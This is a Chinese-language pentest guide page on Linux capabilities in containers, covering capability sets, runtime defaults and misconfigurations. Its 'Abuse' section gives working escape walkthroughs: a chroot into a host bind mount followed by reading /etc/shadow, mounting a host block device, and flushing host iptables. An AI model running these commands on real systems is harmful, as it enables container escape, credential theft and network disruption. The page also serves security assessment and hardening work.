# Linux Capabilities In Containers

{{#include ../../../../banners/hacktricks-training.md}}

## 概述

Linux capabilities 是 container security 中最重要的组成部分之一，因为它们回答了一个微妙但根本性的问题：**container 内的 "root" 到底意味着什么？** 在普通 Linux system 上，UID 0 历来意味着非常广泛的 privilege set。在现代 kernel 中，这些 privilege 被拆分为称为 capabilities 的更小单元。如果移除了相关 capabilities，一个 process 即使以 root 身份运行，仍可能缺少许多强大的操作权限。

Containers 高度依赖这种区别。出于兼容性或简单性原因，许多 workload 仍会在 container 内以 UID 0 启动。如果不删除 capabilities，这将非常危险。删除 capabilities 后，containerized root process 仍可以执行许多普通的 container 内任务，同时被禁止执行更敏感的 kernel 操作。因此，container shell 显示 `uid=0(root)` 并不自动意味着 "host root"，甚至不意味着拥有广泛的 kernel privilege。Capability sets 决定了这个 root 身份实际上有多大价值。

有关完整的 Linux capability reference 及许多 abuse examples，请参阅：

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Operation

Capabilities 会被记录在多个 sets 中，包括 permitted、effective、inheritable、ambient 和 bounding sets。对于许多 container assessments，准确理解每个 set 的 kernel semantics 不如立即回答这个实际问题重要：**此 process 现在能够成功执行哪些 privileged operations，以及未来仍可能获得哪些 privileges？**

这之所以重要，是因为许多 breakout techniques 本质上是伪装成 container 问题的 capability 问题。具有 `CAP_SYS_ADMIN` 的 workload 可以访问大量 normal container root process 不应接触的 kernel functionality。如果一个 workload 具有 `CAP_NET_ADMIN`，同时还共享 host network namespace，那么它的危险性会大幅增加。如果一个 workload 具有 `CAP_SYS_PTRACE`，同时可以通过 host PID sharing 看到 host processes，那么它就更值得关注。在 Docker 或 Podman 中，这可能表现为 `--pid=host`；在 Kubernetes 中，通常表现为 `hostPID: true`。

换句话说，不能孤立地评估 capability set。必须将它与 namespaces、seccomp 和 MAC policy 一起分析。

## Lab

在 container 内检查 capabilities 的一种非常直接的方法是：
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
你还可以将限制更严格的容器与添加了所有 capabilities 的容器进行比较：
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
要查看缩减添加的效果，请尝试先删除所有内容，再只添加回一项 capability：
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
这些小型实验有助于说明，runtime 并不是简单地切换一个名为 "privileged" 的布尔值，而是在塑造进程实际可用的 privilege surface。

## 高风险 Capabilities

虽然许多 capabilities 都可能根据目标而发挥作用，但在 container escape 分析中，有几项 capabilities 反复成为重点。

**`CAP_SYS_ADMIN`** 是 defenders 最应当警惕的一项。它通常被称为 "the new root"，因为它解锁了极其庞大的功能范围，包括与 mount 相关的操作、对 namespace 敏感的行为，以及许多绝不应被随意暴露给 containers 的 kernel 路径。如果一个 container 具备 `CAP_SYS_ADMIN`、seccomp 较弱且没有强有力的 MAC confinement，许多经典 breakout paths 就会变得更加现实。

当进程可见性存在时，**`CAP_SYS_PTRACE`** 就很重要，尤其是在 PID namespace 与 host 或其他有价值的相邻 workloads 共享的情况下。它可以将可见性转化为篡改能力。

在以 network 为重点的环境中，**`CAP_NET_ADMIN`** 和 **`CAP_NET_RAW`** 很重要。在隔离的 bridge network 上，它们可能已经具有风险；而在共享的 host network namespace 中，风险会大得多，因为 workload 可能能够重新配置 host networking、嗅探、spoof，或干扰本地 traffic flows。

在 rootful 环境中，**`CAP_SYS_MODULE`** 通常具有灾难性影响，因为加载 kernel modules 实际上等同于控制 host kernel。它几乎不应出现在通用 container workload 中。

## Runtime 使用

Docker、Podman、基于 containerd 的 stacks 和 CRI-O 都使用 capability controls，但默认设置和管理 interfaces 各不相同。Docker 通过 `--cap-drop` 和 `--cap-add` 等 flags 直接暴露这些 controls。Podman 提供类似的 controls，并且通常可以通过 rootless execution 获得额外的 safety layer。Kubernetes 通过 Pod 或 container 的 `securityContext` 暴露 capability additions 和 drops。LXC/Incus 等 system-container 环境同样依赖 capability control，但这些系统与 host 更广泛的集成，往往会诱使 operators 比在 app-container 环境中更加激进地放宽 defaults。

同一原则适用于所有这些环境：技术上可以授予的 capability，并不意味着就应该授予。许多 real-world incidents 都始于这样的情况：workload 在更严格的 configuration 下运行失败，而 team 需要快速修复，于是 operator 仅仅因为这个原因就添加了某个 capability。

## Misconfigurations

最明显的错误是在 Docker/Podman 风格的 CLIs 中使用 **`--cap-add=ALL`**，但这并不是唯一的问题。实际上，更常见的问题是授予一两个极其强大的 capabilities，尤其是 `CAP_SYS_ADMIN`，以便 "make the application work"，却没有同时理解其对 namespace、seccomp 和 mount 的影响。另一种常见的 failure mode 是将额外 capabilities 与 host namespace sharing 结合使用。在 Docker 或 Podman 中，这可能表现为 `--pid=host`、`--network=host` 或 `--userns=host`；在 Kubernetes 中，等效的 exposure 通常通过 `hostPID: true` 或 `hostNetwork: true` 等 workload settings 出现。这些组合中的每一个都会改变该 capability 实际能够影响的范围。

Administrators 也经常认为，只要 workload 没有完全使用 `--privileged`，它就仍然受到了有意义的约束。有时确实如此，但有时其 effective posture 已经足够接近 privileged，以至于这种区别在 operational 层面不再重要。

## Abuse

第一个 practical step 是枚举 effective capability set，并立即测试那些与 escape 或 host information access 相关的 capability-specific actions：
```bash
capsh --print
grep '^Cap' /proc/self/status
```
如果存在 `CAP_SYS_ADMIN`，请先测试基于 mount 的滥用方式和主机文件系统访问，因为这是最常见的 breakout 促成因素之一：
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
如果存在 `CAP_SYS_PTRACE`，且容器能够看到有价值的进程，请确认该 capability 是否可以用于进程检查：
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
如果存在 `CAP_NET_ADMIN` 或 `CAP_NET_RAW`，请测试该工作负载是否能够操纵可见的网络栈，或至少收集有用的网络情报：
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
当 capability 测试成功后，应结合 namespace 的具体情况进行判断。在隔离 namespace 中看似仅具有风险的 capability，如果容器同时共享 host PID、host network 或 host mounts，可能会立即变成 escape 或 host-recon primitive。

### 完整示例：`CAP_SYS_ADMIN` + Host Mount = Host Escape

如果容器拥有 `CAP_SYS_ADMIN`，并且将 host filesystem 以可写 bind mount 的形式挂载到容器中，例如 `/host`，那么 escape 路径通常非常直接：
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
如果 `chroot` 成功，命令现在将在主机根文件系统上下文中执行：
```bash
id
hostname
cat /etc/shadow | head
```
如果 `chroot` 不可用，通常可以通过挂载的树来调用该 binary，从而实现相同的结果：
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### 完整示例：`CAP_SYS_ADMIN` + 设备访问

如果暴露了来自主机的块设备，`CAP_SYS_ADMIN` 可以将其转变为对主机文件系统的直接访问：
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### 完整示例：`CAP_NET_ADMIN` + 主机网络

此组合并不总是能直接获得主机 root 权限，但可以完全重新配置主机网络栈：
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
这可能导致 denial of service、traffic interception，或访问之前被过滤的服务。

## 检查

capability 检查的目标不仅是转储原始值，还要了解进程是否拥有足够的权限，使其当前的 namespace 和 mount 状态变得危险。
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
这里有哪些值得关注的内容：

- `capsh --print` 是发现高风险 capabilities 的最简单方法，例如 `cap_sys_admin`、`cap_sys_ptrace`、`cap_net_admin` 或 `cap_sys_module`。
- `/proc/self/status` 中的 `CapEff` 行会告诉你当前实际生效的内容，而不仅仅是其他集合中可能可用的内容。
- 如果 container 同时共享 host PID、network 或 user namespaces，或者具有可写的 host mounts，那么 capability dump 的重要性会大幅提升。

收集原始 capability 信息后，下一步是进行解读。需要确认进程是否为 root、user namespaces 是否处于活动状态、是否共享 host namespaces、seccomp 是否处于 enforcing 状态，以及 AppArmor 或 SELinux 是否仍在限制该进程。单独的 capability set 只是整体情况的一部分，但它通常能够解释为什么某个 container breakout 可以成功，而另一个从表面上相同起点开始的 breakout 却会失败。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 默认使用 reduced capability set | Docker 默认保留一组 capability allowlist，并丢弃其余 capability | `--cap-add=<cap>`、`--cap-drop=<cap>`、`--cap-add=ALL`、`--privileged` |
| Podman | 默认使用 reduced capability set | Podman containers 默认是 unprivileged，并使用 reduced capability model | `--cap-add=<cap>`、`--cap-drop=<cap>`、`--privileged` |
| Kubernetes | 除非修改，否则继承 runtime defaults | 如果未指定 `securityContext.capabilities`，container 会从 runtime 获取默认 capability set | `securityContext.capabilities.add`、未执行 `drop: [\"ALL\"]`、`privileged: true` |
| containerd / CRI-O under Kubernetes | 通常使用 runtime default | 实际生效的 set 取决于 runtime 以及 Pod spec | 与 Kubernetes 行相同；直接的 OCI/CRI 配置也可以显式添加 capabilities |

对于 Kubernetes，重要的一点是：API 并未定义一个统一的默认 capability set。如果 Pod 没有添加或丢弃 capabilities，该 workload 会继承其所在节点的 runtime default。

{{#include ../../../../banners/hacktricks-training.md}}
